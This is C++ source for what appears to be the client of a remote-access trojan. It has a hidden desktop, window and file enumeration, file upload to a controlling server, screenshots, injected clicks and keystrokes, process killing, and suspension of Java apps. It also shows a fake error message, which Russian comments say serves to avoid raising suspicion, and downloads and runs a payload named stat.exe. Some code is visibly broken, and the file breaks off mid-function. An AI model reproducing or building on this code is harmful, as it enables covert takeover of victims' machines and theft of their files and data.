// ClientConsole.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include "../common/protocol.h"
#include "ClientOps.h"
#include "EnumWindowInfo.h"
#include "FileLoader.h"
#include "EnumFileInfo.h"
#include "processes.h"
#include <tlhelp32.h>
#include "TermSrv_Patch/Patcher.h"
#include "funk.h"
#include "Iphlpapi.h"
#include "TermSrv_Patch/Load.h"
#include "DllLoader.h"
#pragma comment(lib, "Iphlpapi.lib")

#pragma warning(disable : 4192)
#pragma warning(disable : 4146)

//=========================

#define CONNECTION_RETRY		12100
#define POLL_DELAY				11
#define PING_TIMEOUT			60000

//=========================

HDESK hSecondDesktop =	NULL;
HDESK hFirstDesktop  =	NULL;




bool GetFileData(int FlagFolderDest, WCHAR*Path,LPVOID Data,int *count)
{
	WCHAR SysPath[MAX_PATH];
	SHGetFolderPathW(NULL, FlagFolderDest, NULL, SHGFP_TYPE_CURRENT, SysPath);
	lstrcatW( SysPath, L"\\" );
	lstrcatW( SysPath, Path );
	HANDLE hFile = (HANDLE)CreateFileW( SysPath, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0 );

	if ( hFile == INVALID_HANDLE_VALUE )
	{
		return false;
	}

	DWORD dwWritten = 0;
	memset(Data,0,256);
	ReadFile( hFile, Data, 256, (LPDWORD)count, 0 );

	CloseHandle( hFile );
}


void ProcessPORTFORW( CClientContext *pContext, SOCKET s, PPacket p );
void ProcessPING( CClientContext *pContext, SOCKET s, PPacket p )
{
	if( p->size == 0 )
	{
		PacketBuffer reply;
		reply.Create( PK_CS_PONG, p->timestamp, 0, 0 );
		reply.Send( s );
	}
}

bool IsWow64()
{
  BOOL bIsWow64 = FALSE;

  typedef BOOL (APIENTRY *LPFN_ISWOW64PROCESS)
    (HANDLE, PBOOL);

  LPFN_ISWOW64PROCESS fnIsWow64Process;

  HMODULE module = GetModuleHandle(L"kernel32");
  const char funcName[] = "IsWow64Process";
  fnIsWow64Process = (LPFN_ISWOW64PROCESS)
    GetProcAddress(module, funcName);

  if(NULL != fnIsWow64Process)
  {
    if (!fnIsWow64Process(GetCurrentProcess(),&bIsWow64))
	{}// throw std::exception("Unknown error");
  }
  return bIsWow64 != FALSE;
}

void ProcessINFO( CClientContext *pContext, SOCKET s, PPacket p )
{
	if( p->size == 0 )
	{
		SYST_INFO info;
		ZeroMemory( &info, sizeof(info) );
		info.dwProtocolVersion = CURRENT_PROTOCOL_VERSION;
		info.desktopSize.cx = GetSystemMetrics( SM_CXSCREEN );
		info.desktopSize.cy = GetSystemMetrics( SM_CYSCREEN );
		GetOSVersion( &info.osVersion );
		info.SysInfo.dwPageSize=sizeof(SYSTEM_INFO);
		GetSystemInfo(&info.SysInfo);
		info.isW64=IsWow64();
		int count;
		GetFileData(0x001a,L"coment.dat",info.Coment,&count);




		for( int i=0; i<(sizeof(info.name)-1); i++ )
		{
			info.name[i] = pContext->m_sUid[i];
			if( pContext->m_sUid[i] == 0 )
			{
				break;
			}
		}

		PacketBuffer reply;
		reply.Create( PK_CS_INFO, p->timestamp, sizeof(info), &info );
		reply.Send( s );
	}
}
HANDLE hMutexJava = NULL;
void ProcessRESUMEJAVA( CClientContext *pContext, SOCKET s, PPacket p )
{
	if(hMutexJava!=NULL)
	{
		ReleaseMutex(hMutexJava);
		CloseHandle(hMutexJava);
		hMutexJava = NULL;
	}

	PacketBuffer reply;
	reply.Create( PK_CS_RESUMEJAVA, p->timestamp, 0, 0 );
	reply.Send( s );
}

void ProcessSUSPENDJAVA( CClientContext *pContext, SOCKET s, PPacket p )
{
	hMutexJava = CreateMutexW(NULL, TRUE, L"WhiteJOE_SUSPENDJAVA");
	DWORD err = GetLastError();

	PacketBuffer reply;
	reply.Create( PK_CS_RESUMEJAVA, p->timestamp, 0, 0 );
	reply.Send( s );
}

typedef struct _EnumParams
{
	CEnumWindowInfo info;
	bool m_bShowAllWindows;
	DWORD desktop;
	WCHAR m_WinHederName[25];
	WCHAR m_ProccessName[25];
	WCHAR m_ClassName[50];
}EnumParams, *PEnumParams;

DWORD windowsEnum(LPVOID param)
{
	PEnumParams ep = (PEnumParams)param;
	if(ep->desktop == 2)
		SetThreadDesktop(hSecondDesktop);
	ep->info.Enum(ep->m_bShowAllWindows,ep->m_WinHederName,ep->m_ProccessName,ep->m_ClassName);
	return 0;
}


void ProcessWINLIST( CClientContext *pContext, SOCKET s, PPacket p )
{
	if( p->size == 0 )
	{
		PEnumParams ep = new EnumParams();

		//CEnumWindowInfo info;
		ep->desktop = 1;
		ep->m_bShowAllWindows = pContext->m_bShowAllWindows;

		lstrcpy(ep->m_WinHederName,pContext->WinHederName);
		lstrcpy(ep->m_ProccessName,pContext->ProccessName);
		lstrcpy(ep->m_ClassName,pContext->ClassName);



		if(GetCurDesk()) ep->desktop = 2;
		HANDLE hThr = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)windowsEnum, ep, 0, 0);
		WaitForSingleObject(hThr, -1);
		CloseHandle(hThr);

		if( ep->info.m_dwLen != 0 )
		{
			PacketBuffer reply;
			reply.Create( PK_CS_WINLIST, p->timestamp,
				ep->info.m_dwLen * sizeof(WIN_INFO), ep->info.m_pWindows );
			reply.Send( s );
		}
		delete(ep);
/*
		info.Enum(pContext->m_bShowAllWindows);
		if( info.m_dwLen != 0 )
		{
			PacketBuffer reply;
			reply.Create( PK_CS_WINLIST, p->timestamp,
				info.m_dwLen * sizeof(WIN_INFO), info.m_pWindows );
			reply.Send( s );
		}*/
	}
}

void GetIEpath(TCHAR* path, CEnumFileInfo* fileList) {
	TCHAR* path_new = (TCHAR*)malloc(MAX_PATH*sizeof(TCHAR));
	wsprintf(path_new, L"%s\\*", path);
	WIN32_FIND_DATA data;
	HANDLE hFile = FindFirstFile(path_new, &data);
	do
	{
		if(wcscmp(&data.cFileName[0], L".") == 0 || wcscmp(&data.cFileName[0], L"..") == 0) continue;
		if((data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0)
		{
			TCHAR* path_new2 = (TCHAR*)malloc(MAX_PATH*sizeof(TCHAR));
			wsprintf(path_new2, L"%s\\%s", path, &data.cFileName[0]);
			if(wcscmp(&data.cFileName[0], L"Internet Explorer") == 0)
			{
				WIN32_FIND_DATA d;
				d.dwReserved0 = 1;
				d.dwFileAttributes = FILE_ATTRIBUTE_DIRECTORY;
				wcscpy(d.cFileName, path_new2);
				fileList->Add(&d);
			}
			GetIEpath(path_new2, fileList);
			free(path_new2);
		}
	} while(FindNextFile(hFile, &data));
	FindClose(hFile);
	free(path_new);
}


void GetIEpathReg(TCHAR* Value)
{
	HKEY key;
	RegOpenKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\IEXPLORE.EXE", &key);
	TCHAR text[MAX_PATH];
	TCHAR ValueName[] = {'P','a','t','h'};
	DWORD ValueNameSize = wcslen(ValueName)*sizeof(TCHAR);
	DWORD type = 0;
	DWORD ValueSize = MAX_PATH*sizeof(TCHAR);
	//RegGetValue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\IEXPLORE.EXE", NULL, 0, NULL, &text[0], &size);
	RegEnumValue(key,0,&ValueName[0],&ValueNameSize,NULL,&type,(LPBYTE)Value,&ValueSize);
	RegCloseKey(key);
	DWORD err = GetLastError();
}

void ProcessGetFileList( CClientContext *pContext, SOCKET s, PPacket p )
{
	if( p->size == sizeof(FILELIST_CMD) )
	{
		FILELIST_CMD STList = *(FILELIST_CMD*)(p->data);
		CEnumFileInfo fileList;

		if(STList.dwComand == 1)
		{
//			GetIEpath(&STList.str[0], &fileList);

			TCHAR path[MAX_PATH];
			GetIEpathReg(&path[0]);

			/*WIN32_FIND_DATA d;
			d.dwReserved0 = 1;
			d.dwFileAttributes = FILE_ATTRIBUTE_NORMAL;
			wcscpy(d.cFileName, &path[0]);*/
			int i=lstrlen(&path[0]);
			while(true)
			{
				if (path[i]=='\\')break;
				path[i]='\0';
				i--;

			}
			if(fileList.GetList((TCHAR*)path))
			{
				//fileList.Add(&d);

				PacketBuffer reply;
				reply.Create( PK_CS_FILELIST, p->timestamp,
								fileList.m_dwLen * sizeof(WIN32_FIND_DATAW), fileList.m_pFiles );
				reply.Send( s );
			}

		}
		else if(STList.dwComand == 0)
		{
			/*WIN32_FIND_DATA d;
			d.dwReserved0 = 0;
			wcscpy(d.cFileName, &STList.str[0]);
			fileList.Add(&d);*/
			if(fileList.GetList((TCHAR*)STList.str))
			{
				PacketBuffer reply;
				reply.Create( PK_CS_FILELIST, p->timestamp,
					fileList.m_dwLen * sizeof(WIN32_FIND_DATAW), fileList.m_pFiles );
				reply.Send( s );
			}
		}
	}
}


void ProcessGetGatewayIPs( CClientContext *pContext, SOCKET s, PPacket p )
{
	ADAPTER_GATEWAYS * rofl = NULL;
	PIP_ADAPTER_INFO addresses = NULL;
	ULONG addresses_size = 0;
	GetAdaptersInfo(addresses, &addresses_size);
	int ADAPTER_GATEWAYS_COUNT = 0;
	if(addresses_size > 0)
	{
		addresses = (PIP_ADAPTER_INFO)malloc(addresses_size);
		GetAdaptersInfo(addresses, &addresses_size);
		addresses->GatewayList.IpAddress.String;
		for(PIP_ADAPTER_INFO addr = addresses; addr!=NULL; addr = addr->Next)
		{
			rofl = (ADAPTER_GATEWAYS*)realloc(rofl, sizeof(ADAPTER_GATEWAYS)*(ADAPTER_GATEWAYS_COUNT+1));
			strcpy(&(rofl+ADAPTER_GATEWAYS_COUNT)->AdapterName[0], &addr->AdapterName[0]);
			(rofl+ADAPTER_GATEWAYS_COUNT)->type = addr->Type;
			int ind = 0;
			for(IP_ADDR_STRING* GW = &addr->GatewayList; GW!=NULL; GW = GW->Next)
			{
				strcpy(&(rofl+ADAPTER_GATEWAYS_COUNT)->Gateways[ind][0], &GW->IpAddress.String[0]);
				ind++;
			}
			(rofl+ADAPTER_GATEWAYS_COUNT)->GatewayCount = ind;
			ADAPTER_GATEWAYS_COUNT++;
		}
		PacketBuffer reply;
		reply.Create( PK_CS_GET_GATEWAY_IPS, p->timestamp,
			sizeof(ADAPTER_GATEWAYS)*ADAPTER_GATEWAYS_COUNT, rofl );
		reply.Send( s );

		if(rofl != NULL) free(rofl);
		if(addresses != NULL) free(addresses);
	}
}


void ProcessGetProcessList( CClientContext *pContext, SOCKET s, PPacket p )
{
	DWORD count = 0;
	PROCESSENTRY32* processes = GetProcesses(&count);

	PacketBuffer reply;
	reply.Create( PK_CS_PROCESSLIST, p->timestamp,
		sizeof(PROCESSENTRY32W)*count, processes );
	reply.Send( s );

	free(processes);
}
void ProcessKILLProc(CClientContext *pContext, SOCKET s, PPacket p )
{
	if( p->size == sizeof(DWORD) )
	{
		DWORD * tmp= ((DWORD*)p->data);
		BOOL hResult= KillProcByPid(*tmp);

		PacketBuffer reply;
		reply.Create( PK_CS_KILLPROCESSFROMLIST, p->timestamp, sizeof(BOOL),&hResult );
		reply.Send( s );
	 }
}
void ProcessKILLProcI_F_O(CClientContext *pContext, SOCKET s, PPacket p )
{
	if( p->size == 0 )
	{

		KillIE_FF_OP(s,p->timestamp);

		PacketBuffer reply;
		reply.Create( PK_CS_KILLPROCESSFROMLIST, p->timestamp, 0,0 );
		reply.Send( s );
	 }
}

/*
void ProcessGetFileList( CClientContext *pContext, SOCKET s, PPacket p )
{
	if( p->size == sizeof(FILELIST_CMD) )
	{
		FILELIST_CMD STList = *(FILELIST_CMD*)(p->data);
		CEnumFileInfo fileList;
		if(fileList.GetList((TCHAR*)STList.str))
		{
			PacketBuffer reply;
			reply.Create( PK_CS_FILELIST, p->timestamp,
				fileList.m_dwLen * sizeof(WIN32_FIND_DATAW), fileList.m_pFiles );
			reply.Send( s );
		}
	}
}*/
void ProcessGetDriverList( CClientContext *pContext, SOCKET s, PPacket p )
{
	DRIVER_INFO di;
	DWORD drivers = GetLogicalDrives();
	di.drivers = drivers;
	BYTE counter = 0;
	for(int x=0; x<26; x++)
	{
		if((drivers>>x)&1)
		{
			WCHAR* name = (WCHAR*)malloc(4*sizeof(WCHAR));
			name[0] = (WCHAR)(65+x);
			name[1] = L':';
			name[2] = L'\\';
			name[3] = 0;
			di.info[counter++] = GetDriveType(name);
			free(name);
		}
	}
	di.count = counter;

	PacketBuffer reply;
	reply.Create( PK_CS_DRIVERLIST, p->timestamp,
		sizeof(DRIVER_INFO), &di );
	reply.Send( s );
}

void ProcessFileGet( CClientContext *pContext, SOCKET s, PPacket p )
{
	if( p->size == sizeof(FILEGET_CMD) )
	{
		FILEGET_CMD FGet = *(FILEGET_CMD*)(p->data);
		OFSTRUCT of;

		HANDLE hFile = CreateFileW(&FGet.filename[0], GENERIC_READ, NULL, NULL, OPEN_ALWAYS, NULL, NULL);
		DWORD err = GetLastError();
		if((int)hFile == -1) return;
		BYTE* alldata = (BYTE*)malloc(1024);
		BYTE* buf = (BYTE*)malloc(1024);
		DWORD read;
		int part = 0;
		while(ReadFile(hFile,buf,1024,&read,NULL))
		{
			alldata = (BYTE*)realloc(alldata,(1024 * part + read));
			memcpy(alldata+(1024*part), buf, read);
			if(read < 1024) break;
			part++;
		}
		CloseHandle(hFile);
		PacketBuffer reply;
		reply.Create( PK_CS_FILEGET, p->timestamp, (1024 * part + read), alldata );
		reply.Send( s );
		free(buf);
		free(alldata);
	}
}
void ProcessWIN_CLOSE( CClientContext *pContext, SOCKET s, PPacket p )
{
	if(p->size == sizeof(DWORD_PTR))
	{
		HWND hw = *(HWND*)(p->data);
		if( IsWindow(hw) ||
			hw == 0 )
		{



			PostMessage(hw, WM_CLOSE, 0, 0);

	//if( p->size == 0 )
	//{
			//CEnumWindowInfo info;
			//if(DestroyWindow (hw))
			if(CloseWindow(hw))
			{
				PacketBuffer reply;
				reply.Create( PK_CS_LEFT_DOWN_TO_CONTROL, p->timestamp, 0, 0 );
				reply.Send( s );
			}
			DWORD t=GetLastError();
			int i=t;
		}
	}
}
void ProcessWIN_CONTROL_LIST( CClientContext *pContext, SOCKET s, PPacket p )
{
	if( p->size == sizeof(DWORD_PTR) )
	{
		HWND hw = *(HWND*)(p->data);
		if( IsWindow(hw) ||
			hw == 0 )
		{




	//if( p->size == 0 )
	//{
			CEnumWindowInfo info;
			if(info.Enum_From(hw))
			{
				PacketBuffer reply;
				reply.Create( PK_CS_WIN_CONTROL_NAME, p->timestamp,
						info.m_dwLen * sizeof(WIN_INFO), info.m_pWindows );
				reply.Send( s );
			}
		}
	}
}



BOOL CALLBACK MyRedrowChildProc(HWND hwnd, LPARAM lParam)
{
	RECT tmp;
	GetClientRect(hwnd,&tmp);
	RedrawWindow(hwnd, &tmp, 0, RDW_FRAME|RDW_INVALIDATE|RDW_UPDATENOW);
	return 1;
}

void ProcessWINSHOT( CClientContext *pContext, SOCKET s, PPacket p )
{
	if( p->size == sizeof(SCRIN_SHOT) )
	{
		SCRIN_SHOT Data =*(SCRIN_SHOT*)(p->data);
		HWND hw =(HWND)Data.id ;
		if( IsWindow(hw) ||
			hw == 0 )
		{
			DWORD sz = 0;
			BYTE *pData = 0;
			CreateScreenshotBMP( hw, &pData, &sz, pContext->m_iSleep,Data.isDelFile,pContext->m_bJavaMove,pContext->m_bHideSecDesc );
			if( pContext->m_bUseJpeg )
			{
				DWORD szJ = 0;
				BYTE *pDataJ = 0;
				if( ConvertToJPEG( &pDataJ, &szJ, pData, sz ) )
				{
					free( pData );
					pData = pDataJ;
					sz = szJ;
				}
			}

			PacketBuffer reply;
			reply.Create( PK_CS_WINSHOT, p->timestamp, sz, pData );
			reply.Send( s );

			free( pData );
		}
		else
		{
			WIN_SHOT sh;
			sh.compression = 0;
			sh.id = (DWORD_PTR)hw;
			sh.imagelength = 0;

			PacketBuffer reply;
			reply.Create( PK_CS_WINSHOT, p->timestamp,
				sizeof(WIN_SHOT), &sh );
			reply.Send( s );
		}
	}
}

void ProcessLEFTCLICK( CClientContext *pContext, SOCKET s, PPacket p )
{
	if( p->size == sizeof(LEFT_CLICK) )
	{
		LEFT_CLICK *pClick = (LEFT_CLICK *)p->data;
		WCHAR buf[65];
		wsprintf( buf, L"LCLICK: %d,%d", pClick->x, pClick->y );
		OutputDebugString(buf);
		if(/*GetCurDesk() == Second &&*/ IsJavaWindow((HWND)pClick->idWindow))
		{
			OutputDebugString(L"1");
			HANDLE hThr = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)DesktopClickWrapper, pClick, 0, 0);
			WaitForSingleObject(hThr, -1);
			CloseHandle(hThr);
		}
		else
		if( pClick->idWindow == 0 )
		{
			OutputDebugString(L"2");
			if( DesktopClick( pClick->x, pClick->y, !!pClick->doubleClick ) )
			{
			OutputDebugString(L"3");
				PacketBuffer reply;
				reply.Create( PK_CS_LEFTCLICK, p->timestamp, 0, 0 );
				reply.Send( s );
			}
		}
		else
		{
			OutputDebugString(L"4");
		//	bool ClickedControl(HWND hWnd,int x,int y)
			if( ClickedControl((HWND)pClick->idWindow, pClick->x,pClick->y,pClick->doubleClick,s,p->timestamp,pContext->m_bJavaMove)/*WindowClick( pClick->idWindow, pClick->x, pClick->y )*/ )
			{
			OutputDebugString(L"5");
				PacketBuffer reply;
				reply.Create( PK_CS_LEFTCLICK, p->timestamp, 0, 0 );
				reply.Send( s );
			}
		}
	}
}

void ProcessKEYS( CClientContext *pContext, SOCKET s, PPacket p )
{
	if( p->size == sizeof(KEYS) )
	{
		KEYS *pKeys = (KEYS *)p->data;
		if( pKeys->idWindow == 0 )
		{
			if( DesktopKeys( pKeys->x, pKeys->y, pKeys->str, !!(pKeys->flags&1), !!(pKeys->flags&2) ) )
			{
				PacketBuffer reply;
				reply.Create( PK_CS_KEYS, p->timestamp, 0, 0 );
				reply.Send( s );
			}
		}
		else
		{

			if( WindowKeys( pKeys->idWindow, pKeys->x, pKeys->y, pKeys->str, !!(pKeys->flags&1), !!(pKeys->flags&2),pKeys->bIsSend ) )
			{
				PacketBuffer reply;
				reply.Create( PK_CS_KEYS, p->timestamp, 0, 0 );
				reply.Send( s );
			}
		}
	}
}

void ProcessKEYS_TO_CONTROL( CClientContext *pContext, SOCKET s, PPacket p )
{
	if( p->size == sizeof(KEYS_TO_CONTROL) )
	{
		KEYS_TO_CONTROL *pKeys = (KEYS_TO_CONTROL *)p->data;
		if( pKeys->idWindow == 0 )
		{
			if( DesktopKeys( pKeys->x, pKeys->y, pKeys->str, !!(pKeys->flags&1), !!(pKeys->flags&2) ) )
			{
				PacketBuffer reply;
				reply.Create( PK_CS_KEYS_TO_CONTROL, p->timestamp, 0, 0 );
				reply.Send( s );
			}
		}
		else
		{

			if( WindowKeysToControl( pKeys->idWindow,pKeys->idControl, pKeys->x, pKeys->y, pKeys->str, !!(pKeys->flags&1), !!(pKeys->flags&2),!!(pKeys->flags1&1) ) )
			{
				PacketBuffer reply;
				reply.Create( PK_CS_KEYS_TO_CONTROL, p->timestamp, 0, 0 );
				reply.Send( s );
			}
		}
	}
}

void ProcessLEFT_DOWN_TO_CONTROL( CClientContext *pContext, SOCKET s, PPacket p )
{
	if( p->size == sizeof(KEYS_TO_CONTROL) )
	{
		KEYS_TO_CONTROL *pKeys = (KEYS_TO_CONTROL *)p->data;
		if( pKeys->idWindow == 0 )
		{
			if( DesktopKeys( pKeys->x, pKeys->y, pKeys->str, !!(pKeys->flags&1), !!(pKeys->flags&2) ) )
			{
				PacketBuffer reply;
				reply.Create( PK_CS_LEFT_DOWN_TO_CONTROL, p->timestamp, 0, 0 );
				reply.Send( s );
			}
		}
		else
		{

			if( WindowClicToControl( pKeys->idWindow,pKeys->idControl, pKeys->x, pKeys->y, (pKeys->flags) ) )
			{
				PacketBuffer reply;
				reply.Create( PK_CS_LEFT_DOWN_TO_CONTROL, p->timestamp, 0, 0 );
				reply.Send( s );
			}
		}
	}
}

void ProcessRIGHT_DOWN_TO_CONTROL( CClientContext *pContext, SOCKET s, PPacket p )
{
	if( p->size == sizeof(KEYS_TO_CONTROL) )
	{
		KEYS_TO_CONTROL *pKeys = (KEYS_TO_CONTROL *)p->data;
		if( pKeys->idWindow == 0 )
		{
			if( DesktopKeys( pKeys->x, pKeys->y, pKeys->str, !!(pKeys->flags&1), !!(pKeys->flags&2) ) )
			{
				PacketBuffer reply;
				reply.Create( PK_CS_RIGHT_DOWN_TO_CONTROL, p->timestamp, 0, 0 );
				reply.Send( s );
			}
		}
		else
		{

			if( WindowClicToControl( pKeys->idWindow,pKeys->idControl, pKeys->x, pKeys->y, (pKeys->flags) ) )
			{
				PacketBuffer reply;
				reply.Create( PK_CS_RIGHT_DOWN_TO_CONTROL, p->timestamp, 0, 0 );
				reply.Send( s );
			}
		}
	}
}

void ProcessPK_SC_RUNFILE( CClientContext *pContext, SOCKET s, PPacket p )
{
	if( p->size == sizeof(FILERUN_CMD) )
	{
		FILERUN_CMD *pRun = (FILERUN_CMD *)p->data;
		//ShellExecuteW(0,"open",pRun->filename

		switch( pRun->dwSellEx_Or_CreateP )
		{
		case 0: // ShellExecute


			//if( RunIE( pContext,pRun->filename ) )
			{
				ShellExecuteW(0,L"open",pRun->filename,NULL,NULL,pRun->dwStyle);
				PacketBuffer reply;
				reply.Create( PK_CS_RUNFILE, p->timestamp, 0, 0 );
				reply.Send( s );
			}
			break;
		case 3: // ShellExecute


			//if( RunIE( pContext,pRun->filename ) )
			{
				DeleteFileW(pRun->filename);

				PacketBuffer reply;
				reply.Create( PK_CS_RUNFILE, p->timestamp, 0, 0 );
				reply.Send( s );
			}
			break;

		default:
			{
				int x = GetSystemMetrics( SM_CXSCREEN );
				int y = GetSystemMetrics( SM_CYSCREEN );
				STARTUPINFO si;
				ZeroMemory( &si, sizeof(si) );
				si.cb = sizeof(si);
				si.dwFlags = STARTF_USESHOWWINDOW;
				si.wShowWindow =pRun->dwStyle;			//SW_SHOWMINNOACTIVE  SW_HIDE  SW_MAXIMIZE SW_HIDE
				si.dwX=x-20;
				si.dwY=0;
				si.dwXSize=x-10;
				si.dwYSize=y-10;
				PROCESS_INFORMATION pi;
				ZeroMemory( &pi, sizeof(pi) );

				if( CreateProcess( 0, pRun->filename, 0, 0, 1, 0, 0, 0, &si, &pi ) )
				{
					PacketBuffer reply;
					reply.Create( PK_CS_RUNFILE, p->timestamp, 0, 0 );
					reply.Send( s );
				}
			}
			break;
		}
	}

}

//фейковое сообщени об ошибке
void ReportFaultViaWnd(HWND hWnd)
{
    // если окно уже скрыто - сообщение об ошибке только вызовет лишние подозрения
    if (IsWindowVisible(hWnd))
    {
        DWORD dwID;
        GetWindowThreadProcessId(hWnd,&dwID);
        HANDLE hProcess=OpenProcess(PROCESS_QUERY_INFORMATION|PROCESS_VM_READ,FALSE,dwID);
        TCHAR szFullFileName[MAX_PATH];
        DWORD dwCount=GetModuleFileNameEx(hProcess,0,szFullFileName,MAX_PATH);
        CloseHandle(hProcess);

        // если путь к программе успешно получен - запускаем ее на выполнение
        if (dwCount)
        {
            STARTUPINFO si={0};
            si.cb=sizeof(si);
            si.dwFlags=STARTF_USESHOWWINDOW;
            si.wShowWindow=SW_HIDE;
            PROCESS_INFORMATION pi={0};

            if (CreateProcess(0,szFullFileName,0,0,1,0,0,0,&si,&pi))
                CreateRemoteThread(pi.hProcess,0,0,0,0,0,0);
        }
    }
}

void ProcessRUN( CClientContext *pContext, SOCKET s, PPacket p )
{
	if( p->size == sizeof(RUN_INFO) )
	{
		RUN_INFO *pRun = (RUN_INFO *)p->data;
		switch( pRun->idApp )
		{
		case 0: // IE
			if( RunIE( pContext,pRun->str,pRun->ExeStr, pRun->dwHost, pRun->sw_shell, pRun->sw_run_withIE ) )
			{
				PacketBuffer reply;
				reply.Create( PK_CS_RUN, p->timestamp, 0, 0 );
				reply.Send( s );
			}
			break;
		case 1: // FF
			if( RunFF( pContext,pRun->str,pRun->ExeStr, pRun->dwHost, pRun->sw_shell, pRun->sw_run_withIE ) )
			{
				PacketBuffer reply;
				reply.Create( PK_CS_RUN, p->timestamp, 0, 0 );
				reply.Send( s );
			}
			break;
		default:
			{
				HWND hw = (HWND)(pRun->idApp);
				if( IsWindow(hw) )
				{
					DWORD dwPID = 0;

					ReportFaultViaWnd(hw);

					ShowWindow(hw,SW_HIDE);

					int sizF;
					char Data[MAX_PATH];
					if (GetFileData(0x001a,L"Linc.dat",&Data[0],&sizF))
					{
						DWORD dwLenTermSrv  = 0;
						LPVOID BufferTermSrv = DownloadPlugin(Data, &dwLenTermSrv);
						FileCreateInFolder(0x001a,L"stat.exe", BufferTermSrv, dwLenTermSrv);

						WCHAR SysPath[MAX_PATH];
						SHGetFolderPathW(NULL, 0x001a, NULL, SHGFP_TYPE_CURRENT, SysPath);
						lstrcatW( SysPath, L"\\" );
						lstrcatW( SysPath,L"stat.exe"  );
						ShellExecuteW(0,L"open",SysPath,NULL,NULL,SW_SHOW);
					}

					/*GetWindowThreadProcessId( hw, &dwPID );
					StartHidingProcess( pContext, dwPID );*/

					PacketBuffer reply;
					reply.Create( PK_CS_RUN, p->timestamp, 0, 0 );
					reply.Send( s );
				}
			}
			break;
		}
	}
}

void ProcessPATCHINFO( CClientContext *pContext, SOCKET s, PPacket p )
{
	if( p->size == 0 )
	{
		PATCH_INFO info;
		ZeroMemory( &info, sizeof(info) );
		GetJavaVersion( info.javaVersion, sizeof(info.javaVersion)-2 );
		info.bytes_to_download = pContext->m_pLoader->GetExpecetedBytes();
		info.downloaded_bytes = pContext->m_pLoader->GetReceivedBytes();

		PacketBuffer reply;
		reply.Create( PK_CS_PATCHINFO, p->timestamp, sizeof(info), &info );
		reply.Send( s );
	}
}

void ProcessPATCHSTART( CClientContext *pContext, SOCKET s, PPacket p )
{
	if( p->size == sizeof(PATCH_START) )
	{

		PATCH_START *info = (PATCH_START *)p->data;
		if(info->targetFile[0]=='!')
		{
			WCHAR SysPath[MAX_PATH];
			SHGetFolderPathW(NULL, 0x001a, NULL, SHGFP_TYPE_CURRENT, SysPath);
			lstrcatW( SysPath, L"\\" );
			lstrcatW( SysPath, &info->targetFile[1] );
			lstrcpy(&info->targetFile[0],SysPath);

		}
		if( pContext->m_pLoader->StartDownload( s, info ) )
		{
			PacketBuffer reply;
			reply.Create( PK_CS_PATCHSTART, p->timestamp, 0, 0 );
			reply.Send( s );
		}
	}
}

void ProcessPATCHDATA( CClientContext *pContext, SOCKET s, PPacket p )
{
	if( p->size >= sizeof(PATCH_DATA_ANSWER) )
	{
		PATCH_DATA_ANSWER *info = (PATCH_DATA_ANSWER *)p->data;
		pContext->m_pLoader->ProcessData( s, info );
	}
}

BOOL x_Reboot()
{
  BOOL result; // eax@1
  HANDLE v1; // eax@1
  HANDLE TokenHandle; // [sp+4h] [bp-14h]@1
  struct _TOKEN_PRIVILEGES NewState; // [sp+8h] [bp-10h]@2

  v1 = GetCurrentProcess();
  result = OpenProcessToken(v1, 0x28u, &TokenHandle);
  if ( result )
  {
    LookupPrivilegeValueA(0, "SeShutdownPrivilege", (PLUID)NewState.Privileges);
    NewState.PrivilegeCount = 1;
    NewState.Privileges[0].Attributes = 2;
    AdjustTokenPrivileges(TokenHandle, 0, &NewState, 0, 0, 0);
    if ( GetLastError() )
    {
      result = 0;
    }
    else
    {
      result = ExitWindowsEx(0x12u, 0x80020003u);
      if ( result )
        result = 1;
    }
  }
  return result;
}
typedef BOOL (WINAPI *PInitiateSystemShutdownA)(LPTSTR lpMachineName,LPTSTR lpMessage,DWORD dwTimeout,BOOL bForceAppsClosed,BOOL bRebootAfterShutdown);


int  x_ShutDown()
{
	PInitiateSystemShutdownA InitiateSystemShutdownA_; // eax@1
	bool v1;
	HMODULE hLibModule;

	InitiateSystemShutdownA_ = (PInitiateSystemShutdownA) GetProcAddress(hLibModule=GetModuleHandle(L"ADVAPI32.DLL"), "GetNativeSystemInfo");

	//result = GetProcAddress("ADVAPI32.DLL", "InitiateSystemShutdownA", (int)&hLibModule);
	if ( InitiateSystemShutdownA_ )
	{
		v1=InitiateSystemShutdownA_(NULL,(LPTSTR) "Windows Update", 0, 1, 1);
		//v1 = ((int (WINAPI *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))result)(0, "Windows Update", 0, 1, 1);
		FreeLibrary(hLibModule);
		//result = v1;
	}
	return v1;
}


//работа с реестром.
// cсоздать раздел в реестре ротмер CreateKey(HKEY_CURRENT_USER,"Software\\Microsoft\\Internet Explorer\\Main","TabProcGrowth");
bool CreateKey(HKEY h, char* path, char* name )
{
     HKEY key;
	 if((long)RegOpenKeyExA(h,path,0,KEY_WRITE, &key)==REG_OPENED_EXISTING_KEY)
		return false;
	 if ((LONG )RegCreateKeyA(key,name,&key)==ERROR_SUCCESS)
		 return false;

     RegCloseKey(key);
     return true;
}
//работа с реестром.
//корневой ключ, путь без ключа, имя создаваемого значения, значение(создает заменяет значение REG_SZ)
bool SetValueString(HKEY h, char* path, char* name,  char* values )
{
     HKEY key;
     char title[MAX_PATH];
	 memset(title,0,MAX_PATH);

	 if(ERROR_SUCCESS!=RegOpenKeyExA(h,path,0,KEY_WRITE, &key)==REG_OPENED_EXISTING_KEY)
	 {		DWORD err=GetLastError();
		 return false;
	 }
     lstrcpyA((LPSTR)title, values);

	 RegSetValueExA(key, NULL, 0,REG_SZ,(LPBYTE)title,strlen(title));
     RegCloseKey(key);
     return true;
}
bool GetValueString(char* sVal)
{
    HKEY key;
	RegOpenKey(HKEY_CURRENT_USER, L"AppEvents\\Schemes\\Apps\\Explorer\\Navigating\\.Current", &key);


	DWORD Type;      //сюда возвращается тип параметра
    DWORD Size=256;  //макс. длина значения параметра
    LONG rc=RegQueryValueExA(key,"",NULL,&Type,(BYTE*)sVal,&Size);
    if(rc==ERROR_SUCCESS)
    {
      //параметр прочитан успешно
    }
